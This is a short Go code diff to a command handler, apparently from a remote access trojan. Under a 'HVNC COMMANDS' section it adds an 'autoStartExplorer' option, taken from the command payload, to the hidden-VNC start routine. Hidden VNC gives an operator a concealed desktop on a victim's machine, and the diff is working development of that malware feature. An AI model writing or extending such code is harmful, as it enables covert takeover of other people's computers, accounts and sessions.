@@ -785,6 +785,13 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 
 	// ==================== HVNC COMMANDS ====================
 	case "hvnc_start":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		autoStartExplorer := false
+		if payload != nil {
+			if v, ok := payload["autoStartExplorer"].(bool); ok {
+				autoStartExplorer = v
+			}
+		}
 		env.HVNCMu.Lock()
 		if env.HVNCCancel != nil {
 			env.HVNCCancel()
@@ -795,8 +802,8 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		done := make(chan struct{})
 		env.HVNCDone = done
 		goSafe("hvnc stream", env.Cancel, func() {
-			log.Printf("hvnc: start requested")
-			_ = HVNCStart(hvncCtx, env)
+			log.Printf("hvnc: start requested (autoStartExplorer=%v)", autoStartExplorer)
+			_ = HVNCStart(hvncCtx, env, autoStartExplorer)
 			close(done)
 		})
 		env.HVNCMu.Unlock()
